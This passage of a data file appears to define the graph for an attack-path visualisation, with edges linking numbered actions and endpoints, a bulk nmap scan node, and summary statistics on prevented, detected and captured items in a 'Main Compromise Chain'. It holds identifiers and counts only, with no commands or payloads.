    {edge_id:'s5100EP-c89',edge_source:'s5100EP-a89',edge_target:'s5100EP-a90',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c90',edge_source:'s5100EP-a90',edge_target:'s5100EP-a91',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c91',edge_source:'s5100EP-a91',edge_target:'s5100EP-a92',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c92',edge_source:'s5100EP-a92',edge_target:'s5100EP-a93',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c93',edge_source:'s5100EP-a93',edge_target:'s5100EP-a94',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c94',edge_source:'s5100EP-a94',edge_target:'s5100EP-a95',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c95',edge_source:'s5100EP-a95',edge_target:'s5100EP-a96',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c96',edge_source:'s5100EP-a96',edge_target:'s5100EP-a97',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c97',edge_source:'s5100EP-a97',edge_target:'s5100EP-a98',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c98',edge_source:'s5100EP-a98',edge_target:'s5100EP-a99',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c99',edge_source:'s5100EP-a99',edge_target:'s5100EP-a100',edge_type:'chain_flow'},
    {edge_id:'s5100EP-al01',edge_source:'s5100EP-a01',edge_target:'s5100EP-ep01',edge_type:'asset_link'},
    {edge_id:'s5100EP-al02',edge_source:'s5100EP-a02',edge_target:'s5100EP-ep02',edge_type:'asset_link'},
    {edge_id:'s5100EP-al03',edge_source:'s5100EP-a03',edge_target:'s5100EP-ep03',edge_type:'asset_link'},
    {edge_id:'s5100EP-al04',edge_source:'s5100EP-a04',edge_target:'s5100EP-ep04',edge_type:'asset_link'},
    {edge_id:'s5100EP-al05',edge_source:'s5100EP-a05',edge_target:'s5100EP-ep05',edge_type:'asset_link'},
    {edge_id:'s5100EP-al06',edge_source:'s5100EP-a06',edge_target:'s5100EP-ep06',edge_type:'asset_link'},
    {edge_id:'s5100EP-al07',edge_source:'s5100EP-a07',edge_target:'s5100EP-ep07',edge_type:'asset_link'},
    {edge_id:'s5100EP-al08',edge_source:'s5100EP-a08',edge_target:'s5100EP-ep08',edge_type:'asset_link'},
    {edge_id:'s5100EP-al09',edge_source:'s5100EP-a09',edge_target:'s5100EP-ep09',edge_type:'asset_link'},
    {edge_id:'s5100EP-al10',edge_source:'s5100EP-a10',edge_target:'s5100EP-ep10',edge_type:'asset_link'},
    {edge_id:'s5100EP-al11',edge_source:'s5100EP-a11',edge_target:'s5100EP-ep11',edge_type:'asset_link'},
    {edge_id:'s5100EP-al12',edge_source:'s5100EP-a12',edge_target:'s5100EP-ep12',edge_type:'asset_link'},
    {edge_id:'s5100EP-al13',edge_source:'s5100EP-a13',edge_target:'s5100EP-ep13',edge_type:'asset_link'},
    {edge_id:'s5100EP-al14',edge_source:'s5100EP-a14',edge_target:'s5100EP-ep14',edge_type:'asset_link'},
    {edge_id:'s5100EP-al15',edge_source:'s5100EP-a15',edge_target:'s5100EP-ep15',edge_type:'asset_link'},
    {edge_id:'s5100EP-al16',edge_source:'s5100EP-a16',edge_target:'s5100EP-ep16',edge_type:'asset_link'},
    {edge_id:'s5100EP-al17',edge_source:'s5100EP-a17',edge_target:'s5100EP-ep17',edge_type:'asset_link'},
    {edge_id:'s5100EP-al18',edge_source:'s5100EP-a18',edge_target:'s5100EP-ep18',edge_type:'asset_link'},
    {edge_id:'s5100EP-al19',edge_source:'s5100EP-a19',edge_target:'s5100EP-ep19',edge_type:'asset_link'},
    {edge_id:'s5100EP-al20',edge_source:'s5100EP-a20',edge_target:'s5100EP-ep20',edge_type:'asset_link'},
    {edge_id:'s5100EP-al21',edge_source:'s5100EP-a21',edge_target:'s5100EP-ep21',edge_type:'asset_link'},
    {edge_id:'s5100EP-al22',edge_source:'s5100EP-a22',edge_target:'s5100EP-ep22',edge_type:'asset_link'},
    {edge_id:'s5100EP-al23',edge_source:'s5100EP-a23',edge_target:'s5100EP-ep23',edge_type:'asset_link'},
    {edge_id:'s5100EP-al24',edge_source:'s5100EP-a24',edge_target:'s5100EP-ep24',edge_type:'asset_link'},
    {edge_id:'s5100EP-al25',edge_source:'s5100EP-a25',edge_target:'s5100EP-ep25',edge_type:'asset_link'},
    {edge_id:'s5100EP-al26',edge_source:'s5100EP-a26',edge_target:'s5100EP-ep26',edge_type:'asset_link'},
    {edge_id:'s5100EP-al27',edge_source:'s5100EP-a27',edge_target:'s5100EP-ep27',edge_type:'asset_link'},
    {edge_id:'s5100EP-al28',edge_source:'s5100EP-a28',edge_target:'s5100EP-ep28',edge_type:'asset_link'},
    {edge_id:'s5100EP-al29',edge_source:'s5100EP-a29',edge_target:'s5100EP-ep29',edge_type:'asset_link'},
    {edge_id:'s5100EP-al30',edge_source:'s5100EP-a30',edge_target:'s5100EP-ep30',edge_type:'asset_link'},
    {edge_id:'s5100EP-al31',edge_source:'s5100EP-a31',edge_target:'s5100EP-ep31',edge_type:'asset_link'},
    {edge_id:'s5100EP-al32',edge_source:'s5100EP-a32',edge_target:'s5100EP-ep32',edge_type:'asset_link'},
    {edge_id:'s5100EP-al33',edge_source:'s5100EP-a33',edge_target:'s5100EP-ep33',edge_type:'asset_link'},
    {edge_id:'s5100EP-al34',edge_source:'s5100EP-a34',edge_target:'s5100EP-ep34',edge_type:'asset_link'},
    {edge_id:'s5100EP-al35',edge_source:'s5100EP-a35',edge_target:'s5100EP-ep35',edge_type:'asset_link'},
    {edge_id:'s5100EP-al36',edge_source:'s5100EP-a36',edge_target:'s5100EP-ep36',edge_type:'asset_link'},
    {edge_id:'s5100EP-al37',edge_source:'s5100EP-a37',edge_target:'s5100EP-ep37',edge_type:'asset_link'},
    {edge_id:'s5100EP-al38',edge_source:'s5100EP-a38',edge_target:'s5100EP-ep38',edge_type:'asset_link'},
    {edge_id:'s5100EP-al39',edge_source:'s5100EP-a39',edge_target:'s5100EP-ep39',edge_type:'asset_link'},
    {edge_id:'s5100EP-al40',edge_source:'s5100EP-a40',edge_target:'s5100EP-ep40',edge_type:'asset_link'},
    {edge_id:'s5100EP-al41',edge_source:'s5100EP-a41',edge_target:'s5100EP-ep41',edge_type:'asset_link'},
    {edge_id:'s5100EP-al42',edge_source:'s5100EP-a42',edge_target:'s5100EP-ep42',edge_type:'asset_link'},
    {edge_id:'s5100EP-al43',edge_source:'s5100EP-a43',edge_target:'s5100EP-ep43',edge_type:'asset_link'},
    {edge_id:'s5100EP-al44',edge_source:'s5100EP-a44',edge_target:'s5100EP-ep44',edge_type:'asset_link'},
    {edge_id:'s5100EP-al45',edge_source:'s5100EP-a45',edge_target:'s5100EP-ep45',edge_type:'asset_link'},
    {edge_id:'s5100EP-al46',edge_source:'s5100EP-a46',edge_target:'s5100EP-ep46',edge_type:'asset_link'},
    {edge_id:'s5100EP-al47',edge_source:'s5100EP-a47',edge_target:'s5100EP-ep47',edge_type:'asset_link'},
    {edge_id:'s5100EP-al48',edge_source:'s5100EP-a48',edge_target:'s5100EP-ep48',edge_type:'asset_link'},
    {edge_id:'s5100EP-al49',edge_source:'s5100EP-a49',edge_target:'s5100EP-ep49',edge_type:'asset_link'},
    {edge_id:'s5100EP-al50',edge_source:'s5100EP-a50',edge_target:'s5100EP-ep50',edge_type:'asset_link'},
    {edge_id:'s5100EP-al51',edge_source:'s5100EP-a51',edge_target:'s5100EP-ep51',edge_type:'asset_link'},
    {edge_id:'s5100EP-al52',edge_source:'s5100EP-a52',edge_target:'s5100EP-ep52',edge_type:'asset_link'},
    {edge_id:'s5100EP-al53',edge_source:'s5100EP-a53',edge_target:'s5100EP-ep53',edge_type:'asset_link'},
    {edge_id:'s5100EP-al54',edge_source:'s5100EP-a54',edge_target:'s5100EP-ep54',edge_type:'asset_link'},
    {edge_id:'s5100EP-al55',edge_source:'s5100EP-a55',edge_target:'s5100EP-ep55',edge_type:'asset_link'},
    {edge_id:'s5100EP-al56',edge_source:'s5100EP-a56',edge_target:'s5100EP-ep56',edge_type:'asset_link'},
    {edge_id:'s5100EP-al57',edge_source:'s5100EP-a57',edge_target:'s5100EP-ep57',edge_type:'asset_link'},
    {edge_id:'s5100EP-al58',edge_source:'s5100EP-a58',edge_target:'s5100EP-ep58',edge_type:'asset_link'},
    {edge_id:'s5100EP-al59',edge_source:'s5100EP-a59',edge_target:'s5100EP-ep59',edge_type:'asset_link'},
    {edge_id:'s5100EP-al60',edge_source:'s5100EP-a60',edge_target:'s5100EP-ep60',edge_type:'asset_link'},
    {edge_id:'s5100EP-al61',edge_source:'s5100EP-a61',edge_target:'s5100EP-ep61',edge_type:'asset_link'},
    {edge_id:'s5100EP-al62',edge_source:'s5100EP-a62',edge_target:'s5100EP-ep62',edge_type:'asset_link'},
    {edge_id:'s5100EP-al63',edge_source:'s5100EP-a63',edge_target:'s5100EP-ep63',edge_type:'asset_link'},
    {edge_id:'s5100EP-al64',edge_source:'s5100EP-a64',edge_target:'s5100EP-ep64',edge_type:'asset_link'},
    {edge_id:'s5100EP-al65',edge_source:'s5100EP-a65',edge_target:'s5100EP-ep65',edge_type:'asset_link'},
    {edge_id:'s5100EP-al66',edge_source:'s5100EP-a66',edge_target:'s5100EP-ep66',edge_type:'asset_link'},
    {edge_id:'s5100EP-al67',edge_source:'s5100EP-a67',edge_target:'s5100EP-ep67',edge_type:'asset_link'},
    {edge_id:'s5100EP-al68',edge_source:'s5100EP-a68',edge_target:'s5100EP-ep68',edge_type:'asset_link'},
    {edge_id:'s5100EP-al69',edge_source:'s5100EP-a69',edge_target:'s5100EP-ep69',edge_type:'asset_link'},
    {edge_id:'s5100EP-al70',edge_source:'s5100EP-a70',edge_target:'s5100EP-ep70',edge_type:'asset_link'},
    {edge_id:'s5100EP-al71',edge_source:'s5100EP-a71',edge_target:'s5100EP-ep71',edge_type:'asset_link'},
    {edge_id:'s5100EP-al72',edge_source:'s5100EP-a72',edge_target:'s5100EP-ep72',edge_type:'asset_link'},
    {edge_id:'s5100EP-al73',edge_source:'s5100EP-a73',edge_target:'s5100EP-ep73',edge_type:'asset_link'},
    {edge_id:'s5100EP-al74',edge_source:'s5100EP-a74',edge_target:'s5100EP-ep74',edge_type:'asset_link'},
    {edge_id:'s5100EP-al75',edge_source:'s5100EP-a75',edge_target:'s5100EP-ep75',edge_type:'asset_link'},
    {edge_id:'s5100EP-al76',edge_source:'s5100EP-a76',edge_target:'s5100EP-ep76',edge_type:'asset_link'},
    {edge_id:'s5100EP-al77',edge_source:'s5100EP-a77',edge_target:'s5100EP-ep77',edge_type:'asset_link'},
    {edge_id:'s5100EP-al78',edge_source:'s5100EP-a78',edge_target:'s5100EP-ep78',edge_type:'asset_link'},
    {edge_id:'s5100EP-al79',edge_source:'s5100EP-a79',edge_target:'s5100EP-ep79',edge_type:'asset_link'},
    {edge_id:'s5100EP-al80',edge_source:'s5100EP-a80',edge_target:'s5100EP-ep80',edge_type:'asset_link'},
    {edge_id:'s5100EP-al81',edge_source:'s5100EP-a81',edge_target:'s5100EP-ep81',edge_type:'asset_link'},
    {edge_id:'s5100EP-al82',edge_source:'s5100EP-a82',edge_target:'s5100EP-ep82',edge_type:'asset_link'},
    {edge_id:'s5100EP-al83',edge_source:'s5100EP-a83',edge_target:'s5100EP-ep83',edge_type:'asset_link'},
    {edge_id:'s5100EP-al84',edge_source:'s5100EP-a84',edge_target:'s5100EP-ep84',edge_type:'asset_link'},
    {edge_id:'s5100EP-al85',edge_source:'s5100EP-a85',edge_target:'s5100EP-ep85',edge_type:'asset_link'},
    {edge_id:'s5100EP-al86',edge_source:'s5100EP-a86',edge_target:'s5100EP-ep86',edge_type:'asset_link'},
    {edge_id:'s5100EP-al87',edge_source:'s5100EP-a87',edge_target:'s5100EP-ep87',edge_type:'asset_link'},
    {edge_id:'s5100EP-al88',edge_source:'s5100EP-a88',edge_target:'s5100EP-ep88',edge_type:'asset_link'},
    {edge_id:'s5100EP-al89',edge_source:'s5100EP-a89',edge_target:'s5100EP-ep89',edge_type:'asset_link'},
    {edge_id:'s5100EP-al90',edge_source:'s5100EP-a90',edge_target:'s5100EP-ep90',edge_type:'asset_link'},
    {edge_id:'s5100EP-al91',edge_source:'s5100EP-a91',edge_target:'s5100EP-ep91',edge_type:'asset_link'},
    {edge_id:'s5100EP-al92',edge_source:'s5100EP-a92',edge_target:'s5100EP-ep92',edge_type:'asset_link'},
    {edge_id:'s5100EP-al93',edge_source:'s5100EP-a93',edge_target:'s5100EP-ep93',edge_type:'asset_link'},
    {edge_id:'s5100EP-al94',edge_source:'s5100EP-a94',edge_target:'s5100EP-ep94',edge_type:'asset_link'},
    {edge_id:'s5100EP-al95',edge_source:'s5100EP-a95',edge_target:'s5100EP-ep95',edge_type:'asset_link'},
    {edge_id:'s5100EP-al96',edge_source:'s5100EP-a96',edge_target:'s5100EP-ep96',edge_type:'asset_link'},
    {edge_id:'s5100EP-al97',edge_source:'s5100EP-a97',edge_target:'s5100EP-ep97',edge_type:'asset_link'},
    {edge_id:'s5100EP-al98',edge_source:'s5100EP-a98',edge_target:'s5100EP-ep98',edge_type:'asset_link'},
    {edge_id:'s5100EP-al99',edge_source:'s5100EP-a99',edge_target:'s5100EP-ep99',edge_type:'asset_link'},
    {edge_id:'s5100EP-al100',edge_source:'s5100EP-a100',edge_target:'s5100EP-ep100',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep01',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep01',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep02',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep02',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep03',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep03',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep04',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep04',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep05',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep05',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep06',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep06',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep07',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep07',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep08',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep08',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep09',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep09',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep10',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep10',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep11',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep11',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep12',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep12',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep13',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep13',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep14',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep14',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep15',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep15',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep16',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep16',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep17',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep17',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep18',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep18',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep19',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep19',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep20',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep20',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep21',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep21',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep22',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep22',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep23',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep23',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep24',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep24',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep25',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep25',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep26',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep26',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep27',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep27',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep28',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep28',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep29',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep29',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep30',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep30',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep31',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep31',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep32',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep32',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep33',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep33',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep34',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep34',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep35',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep35',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep36',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep36',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep37',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep37',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep38',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep38',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep39',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep39',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep40',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep40',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep41',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep41',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep42',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep42',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep43',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep43',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep44',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep44',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep45',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep45',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep46',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep46',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep47',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep47',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep48',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep48',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep49',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep49',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep50',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep50',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep51',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep51',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep52',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep52',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep53',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep53',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep54',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep54',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep55',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep55',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep56',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep56',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep57',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep57',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep58',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep58',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep59',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep59',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep60',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep60',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep61',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep61',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep62',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep62',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep63',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep63',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep64',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep64',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep65',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep65',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep66',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep66',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep67',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep67',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep68',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep68',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep69',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep69',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep70',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep70',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep71',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep71',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep72',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep72',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep73',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep73',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep74',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep74',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep75',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep75',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep76',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep76',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep77',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep77',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep78',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep78',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep79',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep79',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep80',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep80',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep81',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep81',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep82',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep82',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep83',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep83',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep84',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep84',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep85',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep85',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep86',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep86',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep87',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep87',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep88',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep88',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep89',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep89',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep90',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep90',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep91',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep91',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep92',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep92',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep93',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep93',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep94',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep94',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep95',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep95',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep96',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep96',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep97',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep97',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep98',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep98',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep99',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep99',edge_type:'asset_link'},
    {edge_id:'s5100EP-nmap-ep100',edge_source:'s5100EP-a-nmap-bulk',edge_target:'s5100EP-ep100',edge_type:'asset_link'},
  ],
  attack_path_stats:{
    stats_prevented:16,stats_detected:18,stats_undetected:66,
    stats_pending:0,stats_total_actions:101,stats_executed_actions:101,
    stats_captured_endpoints:46,stats_captured_files:84,stats_captured_credentials:84,
stats_captured_users: 59,
stats_captured_cves: 38,
  },
  attack_path_definitions:[
    {path_id:'s5100EP-p1',path_name:'Main Compromise Chain',path_color:'#e91e63',node_ids:['s5100EP-ep01','s5100EP-ep03','s5100EP-ep05','s5100EP-ep06','s5100EP-ep07','s5100EP-ep09','s5100EP-ep11','s5100EP-ep12','s5100EP-ep13','s5100EP-ep14','s5100EP-ep17','s5100EP-ep19','s5100EP-ep21','s5100EP-ep24','s5100EP-ep25','s5100EP-ep27','s5100EP-ep28','s5100EP-ep30','s5100EP-ep32','s5100EP-ep33','s5100EP-ep34','s5100EP-ep36','s5100EP-ep38','s5100EP-ep41','s5100EP-ep43','s5100EP-ep45','s5100EP-ep48','s5100EP-ep49','s5100EP-ep51','s5100EP-ep53','s5100EP-ep54','s5100EP-ep56','s5100EP-ep57','s5100EP-ep60','s5100EP-ep65','s5100EP-ep66','s5100EP-ep69','s5100EP-ep72','s5100EP-ep76','s5100EP-ep100'],path_outcome:'success'},
